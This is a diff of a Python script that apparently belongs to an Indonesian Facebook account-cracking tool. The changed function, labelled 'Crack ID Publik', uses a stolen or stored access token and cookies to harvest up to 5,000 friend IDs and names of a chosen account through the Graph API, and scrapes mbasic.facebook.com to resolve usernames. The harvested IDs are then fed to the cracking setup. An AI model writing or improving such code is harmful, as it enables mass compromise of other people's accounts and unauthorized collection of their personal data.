@@ -397,32 +397,33 @@ def file():
 				back()
 
 def dump_publik():
-	try:
-		token = open('.token.txt','r').read()
-	except IOError:
-		exit()
-	win = '>_𝑪𝒓𝒂𝒄𝒌 𝑰𝑫 𝑷𝒖𝒃𝒍𝒊𝒌'
-	win2 = mark(win, style='cyan')
-	sol().print(win2)
-	print('\033[33m➣ 𝑲𝒆𝒕𝒊𝒌 ❞𝒎𝒆❞ 𝑱𝒊𝒌𝒂 𝑰𝒏𝒈𝒊𝒏 𝑫𝒖𝒎𝒑 𝑰𝑫 𝑫𝒂𝒓𝒊 𝑻𝒆𝒎𝒂𝒏')
-	pil = input('\033[33m➣ 𝑴𝒂𝒔𝒖𝒌𝒂𝒏 𝑰𝑫 𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 : ')
-	try:
-		koh2 = requests.get('https://graph.facebook.com/{user}?fields=name,friends.fields(id,name).limit(5000)&access_token='+tokenku[0]).json()
-		for pi in koh2['friends']['data']:
-			try:id.append(pi['id']+'|'+pi['name'])
-			except:continue
-		print('\033[33m➣ Total : '+str(len(id)))
-		setting()
-	except requests.exceptions.ConnectionError:
-		li = '➣ 𝑲𝒐𝒏𝒆𝒌𝒔𝒊 𝑰𝒏𝒕𝒆𝒓𝒏𝒆𝒕 𝑩𝒆𝒓𝒎𝒂𝒔𝒂𝒍𝒂𝒉'
-		lo = mark(li, style='red')
-		sol().print(lo, style='cyan')
-		exit()
-	except (KeyError,IOError):
-		teks = '➣ 𝑷𝒆𝒓𝒕𝒆𝒎𝒂𝒏𝒂𝒏 𝑷𝒓𝒊𝒗𝒂𝒕𝒆 𝑨𝒕𝒂𝒖 𝑻𝒐𝒌𝒆𝒏 𝑹𝒖𝒔𝒂𝒌'
-		teks2 = mark(teks, style='red')
-		sol().print(teks2)
-		login_lagi()
+    try:
+        token = open("token.txt","r").read()
+        cookie = {"cookie":open("cookies.txt","r").read()}
+    except IOError:
+        print(Panel("Cookies kadaluwarsa, silahkan login ulang dengan cookies yang baru"))
+        exit()
+    print(Panel("isi 'me' jika ingin crack dari daftar teman"))
+    idt = input("  [%sf%s] masukan username atau id : "%(B,P))
+    if idt in[""]:
+        memu()
+    elif(re.findall("\w+",idt)):
+        r = requests.get("https://mbasic.facebook.com/"+idt).text
+        try:
+            user = re.findall('\;rid\=(\d+)\&',str(r))[0]
+        except:
+            user = idt
+    try:
+        for i in requests.get("https://graph.facebook.com/v13.0/%s?fields=friends.limit(5000)&access_token=%s"%(user,token),cookies=cookie).json()["friends"]["data"]:
+            id.append(i["id"]+"<=>"+i["name"])
+    except KeyError:
+        print(Panel("Akun tidak tersedia atau list teman private"))
+    if len(id) !=0:
+        print(Panel(f"[+] total id -> {M2}{len(id)}{Z2}"))
+        setting()
+    else:
+        print(Panel(f"[+] total id -> {M2}{len(id)}{Z2}"))
+        exit()
 
 def dump_massal():
 	win = ' 𝑫𝒖𝒎𝒑 𝑰𝑫 𝑷𝒖𝒃𝒍𝒊𝒌 𝑴𝒂𝒔𝒔𝒂𝒍'
@@ -1605,4 +1606,3 @@ if __name__=='__main__':
 	except:pass
 	#licensi
 	janda_sebalah()
-
